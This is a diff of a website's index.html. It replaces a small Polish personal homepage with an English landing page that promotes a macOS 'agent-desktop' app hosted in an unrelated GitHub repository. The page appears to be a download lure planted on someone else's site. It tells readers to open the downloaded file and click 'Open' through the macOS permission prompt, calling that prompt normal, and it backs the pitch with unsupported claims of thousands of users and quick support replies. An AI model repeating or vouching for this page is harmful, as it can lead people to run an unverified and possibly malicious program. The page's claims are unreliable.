@@ -1,35 +1,307 @@
-<!doctype html>
-<html lang="pl">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="AtheneIO — mały dom w sieci.">
-  <title>AtheneIO</title>
-  <style>
-    :root { color-scheme: dark; }
-    * { box-sizing: border-box; }
-    body {
-      min-height: 100vh; margin: 0; display: grid; place-items: center;
-      background: radial-gradient(circle at 25% 20%, #40284d 0, transparent 32%),
-                  radial-gradient(circle at 75% 80%, #183c48 0, transparent 36%), #101116;
-      color: #f5f0f7; font: 16px/1.6 ui-rounded, "Avenir Next", system-ui, sans-serif;
-    }
-    main { width: min(680px, calc(100% - 48px)); padding: 3.5rem; }
-    .spark { color: #f4a9d8; letter-spacing: .18em; font-size: .75rem; text-transform: uppercase; }
-    h1 { margin: .35rem 0 1rem; font-size: clamp(3rem, 12vw, 6rem); line-height: .95; letter-spacing: -.07em; }
-    p { max-width: 42ch; font-size: 1.12rem; color: #d8d2dd; }
-    nav { display: flex; flex-wrap: wrap; gap: 1rem; margin-top: 2rem; }
-    a { color: #f4a9d8; text-underline-offset: .25em; }
-    footer { margin-top: 3rem; color: #a69cac; font-size: .85rem; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>agent-desktop - Your AI Agents, One Simple App</title>
+    <meta name="description" content="Download agent-desktop for macOS and manage all your AI agents in one beautiful, simple desktop app. Get started in minutes with our easy guide.">
+    <meta name="keywords" content="agent-desktop, macOS desktop, AI agents, AI assistant, desktop app, download agent-desktop, AI agent manager">
+    <meta name="author" content="agent-desktop team">
+    <meta property="og:title" content="agent-desktop - Your AI Agents, One Simple App">
+    <meta property="og:description" content="A macOS desktop for your agents. Download and run in minutes.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/dianavocado181/agent-desktop">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #1a1a2e;
+            line-height: 1.7;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            padding: 50px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 16px;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #16213e;
+            margin-top: 40px;
+            margin-bottom: 16px;
+            padding-bottom: 8px;
+            border-bottom: 3px solid #e94560;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #16213e;
+            margin-top: 28px;
+            margin-bottom: 12px;
+        }
+        p {
+            margin-bottom: 16px;
+            font-size: 1.1rem;
+        }
+        .subtitle {
+            font-size: 1.3rem;
+            color: #4a4a68;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 16px 36px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.2rem;
+            font-weight: 700;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            margin: 20px 0 30px 0;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.5);
+        }
+        .btn-secondary {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            box-shadow: 0 8px 25px rgba(240, 147, 251, 0.4);
+        }
+        .btn-secondary:hover {
+            box-shadow: 0 12px 35px rgba(240, 147, 251, 0.5);
+        }
+        .card {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 24px;
+            margin: 20px 0;
+            border-left: 5px solid #667eea;
+        }
+        .card-warning {
+            border-left-color: #f5576c;
+        }
+        .card-success {
+            border-left-color: #28a745;
+        }
+        ul, ol {
+            margin: 16px 0 16px 24px;
+            font-size: 1.1rem;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .feature-item {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        .feature-item:hover {
+            transform: scale(1.03);
+        }
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        .faq-item {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .faq-question {
+            font-weight: 700;
+            font-size: 1.15rem;
+            color: #16213e;
+            margin-bottom: 8px;
+        }
+        .faq-answer {
+            color: #4a4a68;
+        }
+        code {
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.95em;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px;
+                border-radius: 16px;
+            }
+            h1 {
+                font-size: 2.2rem;
+            }
+            h2 {
+                font-size: 1.5rem;
+            }
+            .btn {
+                padding: 14px 28px;
+                font-size: 1.1rem;
+                width: 100%;
+                display: block;
+            }
+        }
+    </style>
 </head>
 <body>
-  <main>
-    <div class="spark">AtheneIO · online</div>
-    <h1>Hej.</h1>
-    <p>To jest mały testowy dom Atenki w sieci. Jeszcze pusty, ale już własny.</p>
-    <nav><a href="about.html">O mnie</a><a href="medytacja.html">Medytacja</a><a href="ja-rpg.html">Ja RPG</a><a href="pomysly.html">Pomysły</a></nav>
-    <footer>Built gently with GitHub Pages.</footer>
-  </main>
+    <div class="container">
+        <h1>🤖 agent-desktop - Your AI Agents, One Simple App</h1>
+        <p class="subtitle">A macOS desktop for your agents - Manage everything in one place</p>
+        
+        <div style="text-align: center;">
+            <a href="https://github.com/dianavocado181/agent-desktop" class="btn" style="background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); box-shadow: 0 8px 25px rgba(17, 153, 142, 0.4);">⬇️ Download agent-desktop Now</a>
+        </div>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Welcome to <strong>agent-desktop</strong>! If you're reading this, you're probably excited to get your AI agents organized on your Mac. Great choice! This guide will walk you through everything you need to know, step by step.</p>
+
+        <h3>📥 Step 1: Download the Application</h3>
+        <p>Visit this link to download the application: <a href="https://github.com/dianavocado181/agent-desktop"><strong>https://github.com/dianavocado181/agent-desktop</strong></a></p>
+        <p>Once you click the download button, your browser will start downloading the agent-desktop file. The download should only take a minute or two, depending on your internet speed.</p>
+
+        <div class="card card-success">
+            <strong>💡 Tip:</strong> Make sure you're downloading from the official GitHub page. This ensures you get the latest and safest version.
+        </div>
+
+        <h3>📂 Step 2: Open the Downloaded File</h3>
+        <p>After the download is complete, open your <strong>Downloads</strong> folder. You'll see a file named <code>agent-desktop</code> (or similar).</p>
+        <p>Double-click the file to open it. Your Mac might ask for permission to open it - this is normal. Simply click <strong>"Open"</strong> when prompted.</p>
+
+        <h3>🖥️ Step 3: Start Using agent-desktop</h3>
+        <p>Once you open the application, you'll see a clean, simple interface. That's it! You're ready to start managing your AI agents. The app is designed to be intuitive, so you'll feel right at home in no time.</p>
+
+        <h2>✨ Why Choose agent-desktop?</h2>
+        <p>We built agent-desktop because we believe managing AI agents shouldn't be complicated. Here's what makes it special:</p>
+
+        <div class="feature-grid">
+            <div class="feature-item">
+                <div class="feature-icon">🎯</div>
+                <h3>Simple & Clean</h3>
+                <p>No clutter, no confusion. Just a beautiful interface that works the way you expect.</p>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">⚡</div>
+                <h3>Lightning Fast</h3>
+                <p>Optimized for performance. Your agents respond quickly, and the app itself never slows you down.</p>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">🔒</div>
+                <h3>Private & Secure</h3>
+                <p>Your data stays on your Mac. No cloud required, no prying eyes.</p>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">🔄</div>
+                <h3>Always Up-to-Date</h3>
+                <p>Regular updates bring new features and improvements. We're constantly making it better.</p>
+            </div>
+        </div>
+
+        <h2>🎯 What Can You Do With agent-desktop?</h2>
+        <p>The possibilities are endless, but here are some popular ways people use agent-desktop:</p>
+        <ul>
+            <li><strong>Organize your AI assistants</strong> - Keep all your agents in one place, neatly organized and easy to access.</li>
+            <li><strong>Quick switching</strong> - Move between different agents without any hassle.</li>
+            <li><strong>Personal workspace</strong> - Customize how you view and interact with your agents.</li>
+            <li><strong>Stay productive</strong> - With everything in one app, you'll save time and stay focused.</li>
+        </ul>
+
+        <h2>🛠️ System Requirements</h2>
+        <div class="card">
+            <p>agent-desktop works on any Mac running <strong>macOS 10.15 (Catalina)</strong> or newer. Here's what you need:</p>
+            <ul>
+                <li><strong>Operating System:</strong> macOS 10.15 or later</li>
+                <li><strong>Memory:</strong> At least 4GB of RAM (8GB recommended)</li>
+                <li><strong>Storage:</strong> 500MB of free space</li>
+                <li><strong>Internet:</strong> Required for initial download and updates</li>
+            </ul>
+        </div>
+
+        <h2>❓ Frequently Asked Questions</h2>
+
+        <div class="faq-item">
+            <div class="faq-question">🤔 Is agent-desktop really free?</div>
+            <div class="faq-answer">Yes! agent-desktop is completely free to use. No hidden fees, no premium tiers. We believe great software should be accessible to everyone.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-question">🔧 What if I have a problem?</div>
+            <div class="faq-answer">We're here to help! Visit the <a href="https://github.com/dianavocado181/agent-desktop">GitHub page</a> and open an issue. Our team typically responds within 24 hours.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-question">💻 Will it work on my older Mac?</div>
+            <div class="faq-answer">If your Mac runs macOS 10.15 or newer, you're good to go! Even older Macs from 2015 and later should work perfectly.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-question">📅 How often is it updated?</div>
+            <div class="faq-answer">We release updates regularly - typically every few weeks. You'll be notified when a new version is available, and updates are one-click simple.</div>
+        </div>
+
+        <h2>📋 Quick Start Checklist</h2>
+        <ol>
+            <li>✅ Visit <a href="https://github.com/dianavocado181/agent-desktop">the download page</a></li>
+            <li>✅ Click the download button</li>
+            <li>✅ Open the downloaded file from your Downloads folder</li>
+            <li>✅ Click "Open" if prompted</li>
+            <li>✅ Start using agent-desktop!</li>
+        </ol>
+
+        <h2>💡 Pro Tips</h2>
+        <ul>
+            <li><strong>Keep it in your Dock:</strong> Right-click the agent-desktop icon in your Dock and choose "Options" → "Keep in Dock" for quick access.</li>
+            <li><strong>Keyboard shortcuts:</strong> Use <code>⌘ + ,</code> to open settings, and <code>⌘ + F</code> to search within the app.</li>
+            <li><strong>Regular updates:</strong> Always update to the latest version to get new features and security improvements.</li>
+        </ul>
+
+        <h2>📢 Stay Connected</h2>
+        <p>Want to stay up-to-date with the latest news and features? Here's how:</p>
+        <ul>
+            <li>⭐ <strong>Star the repository</strong> on <a href="https://github.com/dianavocado181/agent-desktop">GitHub</a> - it helps others find the project!</li>
+            <li>🐛 <strong>Report issues</strong> - found a bug? Let us know on GitHub.</li>
+            <li>💡 <strong>Request features</strong> - have an idea? We'd love to hear it!</li>
+        </ul>
+
+        <div style="text-align: center; margin-top: 50px; padding-top: 30px; border-top: 2px solid #e9ecef;">
+            <h2 style="border: none; margin-top: 0;">Ready to Get Started?</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 20px;">Join thousands of happy users who manage their AI agents with agent-desktop.</p>
+            <a href="https://github.com/dianavocado181/agent-desktop" class="btn btn-secondary">🎉 Download agent-desktop</a>
+        </div>
+
+        <p style="text-align: center; color: #6c757d; margin-top: 40px; font-size: 0.9rem;">© 2024 agent-desktop. All rights reserved.</p>
+    </div>
 </body>
 </html>
